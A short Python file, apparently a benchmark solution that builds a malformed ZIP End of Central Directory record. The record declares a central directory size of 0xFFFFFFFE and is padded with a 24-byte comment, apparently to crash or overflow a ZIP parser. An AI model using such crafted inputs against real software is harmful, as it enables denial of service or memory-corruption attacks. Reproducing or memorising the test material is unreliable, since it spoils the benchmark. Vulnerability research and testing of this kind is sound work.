import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        eocd = struct.pack('<IHHHHIIH', 0x06054B50, 0, 0, 1, 1, 0xFFFFFFFE, 0, 24)
        comment = b'A' * 24
        return eocd + comment
